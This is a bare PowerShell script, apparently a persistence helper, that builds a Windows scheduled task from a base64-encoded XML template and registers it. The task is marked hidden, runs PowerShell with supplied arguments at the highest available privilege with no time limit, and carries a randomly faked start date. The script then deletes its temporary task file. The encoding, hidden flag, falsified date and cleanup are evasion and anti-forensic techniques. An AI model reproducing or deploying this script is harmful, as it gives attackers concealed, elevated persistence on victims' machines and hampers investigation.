Function Get-RandomDate
{
	$Start = New-Object DateTime 1753,1,1
	$Range = (([DateTime]::Today) - $Start).TotalMinutes
	return $Start.AddMinutes((New-Object Random).Next($Range))
}

#$ts = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\task_source.xml -Raw)))
#add-type -ass system.windows.forms;[System.Windows.Forms.Clipboard]::SetText($ts)
#[Xml] $Task = Get-Content .\task_source.xml
[Xml] $Task = [Text.Encoding]::UTF8.GetString( [Convert]::FromBase64String("PFRhc2sgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA0LzAyL21pdC90YXNrIj4NCiAgPFRyaWdnZXJzPg0KICAgIDxUaW1lVHJpZ2dlcj4NCiAgICAgIDxTdGFydEJvdW5kYXJ5PjwvU3RhcnRCb3VuZGFyeT4NCiAgICAgIDxFbmFibGVkPmZhbHNlPC9FbmFibGVkPg0KICAgIDwvVGltZVRyaWdnZXI+DQogIDwvVHJpZ2dlcnM+DQogIDxQcmluY2lwYWxzPg0KICAgIDxQcmluY2lwYWwgaWQ9IkF1dGhvciI+DQogICAgICA8UnVuTGV2ZWw+SGlnaGVzdEF2YWlsYWJsZTwvUnVuTGV2ZWw+DQogICAgICA8VXNlcklkPjwvVXNlcklkPg0KICAgICAgPExvZ29uVHlwZT5TNFU8L0xvZ29uVHlwZT4NCiAgICA8L1ByaW5jaXBhbD4NCiAgPC9QcmluY2lwYWxzPg0KICA8U2V0dGluZ3M+DQogICAgPE11bHRpcGxlSW5zdGFuY2VzUG9saWN5PlBhcmFsbGVsPC9NdWx0aXBsZUluc3RhbmNlc1BvbGljeT4NCiAgICA8RGlzYWxsb3dTdGFydElmT25CYXR0ZXJpZXM+ZmFsc2U8L0Rpc2FsbG93U3RhcnRJZk9uQmF0dGVyaWVzPg0KICAgIDxTdG9wSWZHb2luZ09uQmF0dGVyaWVzPnRydWU8L1N0b3BJZkdvaW5nT25CYXR0ZXJpZXM+DQogICAgPEFsbG93SGFyZFRlcm1pbmF0ZT5mYWxzZTwvQWxsb3dIYXJkVGVybWluYXRlPg0KICAgIDxTdGFydFdoZW5BdmFpbGFibGU+ZmFsc2U8L1N0YXJ0V2hlbkF2YWlsYWJsZT4NCiAgICA8UnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT5mYWxzZTwvUnVuT25seUlmTmV0d29ya0F2YWlsYWJsZT4NCiAgICA8SWRsZVNldHRpbmdzPg0KICAgICAgPFN0b3BPbklkbGVFbmQ+dHJ1ZTwvU3RvcE9uSWRsZUVuZD4NCiAgICAgIDxSZXN0YXJ0T25JZGxlPmZhbHNlPC9SZXN0YXJ0T25JZGxlPg0KICAgIDwvSWRsZVNldHRpbmdzPg0KICAgIDxBbGxvd1N0YXJ0T25EZW1hbmQ+dHJ1ZTwvQWxsb3dTdGFydE9uRGVtYW5kPg0KICAgIDxFbmFibGVkPnRydWU8L0VuYWJsZWQ+DQogICAgPEhpZGRlbj50cnVlPC9IaWRkZW4+DQogICAgPFJ1bk9ubHlJZklkbGU+ZmFsc2U8L1J1bk9ubHlJZklkbGU+DQogICAgPFdha2VUb1J1bj5mYWxzZTwvV2FrZVRvUnVuPg0KICAgIDxFeGVjdXRpb25UaW1lTGltaXQ+UFQwUzwvRXhlY3V0aW9uVGltZUxpbWl0Pg0KICAgIDxQcmlvcml0eT43PC9Qcmlvcml0eT4NCiAgPC9TZXR0aW5ncz4NCiAgPEFjdGlvbnMgQ29udGV4dD0iQXV0aG9yIj4NCiAgICA8RXhlYz4NCiAgICAgIDxDb21tYW5kPjwvQ29tbWFuZD4NCiAgICAgIDxBcmd1bWVudHM+PC9Bcmd1bWVudHM+DQogICAgPC9FeGVjPg0KICA8L0FjdGlvbnM+DQo8L1Rhc2s+") )
# Set a random/fake date
$RandomDate = Get-RandomDate
$Task.Task.Triggers.TimeTrigger.StartBoundary = "$(Get-Date $RandomDate -Format 'yyyy-MM-ddThh:mm:ss')"
# Set the username and domain with which the task will be executed
$Task.Task.Principals.Principal.UserId = "$env:USERDOMAIN\$env:USERNAME"
$Task.Task.Actions.Exec.Command = (Command powershell.exe).Definition
$Task.Task.Actions.Exec.Arguments = "$Arguments"

$TMPPath = Join-Path $env:TMP $([Guid]::NewGuid().Guid)
# Save the task
$Task.Save($TMPPath)
# Create task
schtasks.exe /CREATE /F /TN TaskName /XML $TMPPath
# Remove task file
Remove-Item -Path $TMPPath -Force
# schtasks.exe /RUN /TN TaskName
# schtasks.exe /DELETE /F /TN TaskName